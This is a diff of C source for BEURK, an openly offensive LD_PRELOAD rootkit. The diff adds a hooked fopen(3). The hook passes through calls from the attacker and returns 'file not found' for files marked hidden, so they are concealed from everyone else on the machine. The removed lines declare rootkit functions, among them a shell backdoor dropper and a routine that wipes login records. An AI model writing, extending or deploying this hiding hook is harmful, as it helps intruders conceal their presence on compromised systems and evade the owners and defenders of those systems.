@@ -18,22 +18,23 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
+#include <errno.h> /* errno, ENOENT */
+#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_FOPEN() */
+#include "hooks.h" /* prototype, FILE */
 
-#include <sys/socket.h>
-#include "debug.h"
+// TODO: is_procnet()
 
-/* init.c */
-void        init(void) __attribute__((constructor));
+FILE *fopen(const char *__restrict path, const char *mode) {
+    DEBUG(D_INFO, "called fopen(3) hook");
 
-/* is_attacker.c */
-int         is_attacker(void);
+    if (is_attacker())
+        return (REAL_FOPEN(path, mode));
 
-/* is_hidden_file.c */
-int         is_hidden_file(const char *path);
+    if (is_hidden_file(path)) {
+        errno = ENOENT;
+        return NULL;
+    }
 
-/* cleanup_login_records.c */
-void        cleanup_login_records(const char *pty_name);
-
-/* drop_shell_backdoor.c */
-int         drop_shell_backdoor(int sock, struct sockaddr *addr);
+    return (REAL_FOPEN(path, mode));
+}
